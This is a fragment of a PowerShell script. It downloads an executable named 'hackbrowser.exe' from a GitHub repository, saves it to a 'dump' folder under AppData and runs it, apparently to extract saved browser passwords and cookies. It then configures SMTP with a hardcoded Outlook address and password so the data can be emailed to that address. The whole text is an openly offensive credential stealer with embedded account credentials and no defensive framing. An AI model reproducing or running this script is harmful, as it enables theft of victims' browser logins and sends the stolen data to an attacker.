...
Invoke-WebRequest -Uri "https://github.com/shibadoggo373/scripytsall/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("gabrielthiago019@outlook.com", "gABIGOL123");
$smtp.EnableSsl = $true
$Message.From = "gabrielthiago019@outlook.com"
$Message.To.Add("gabrielthiago019@outlook.com")
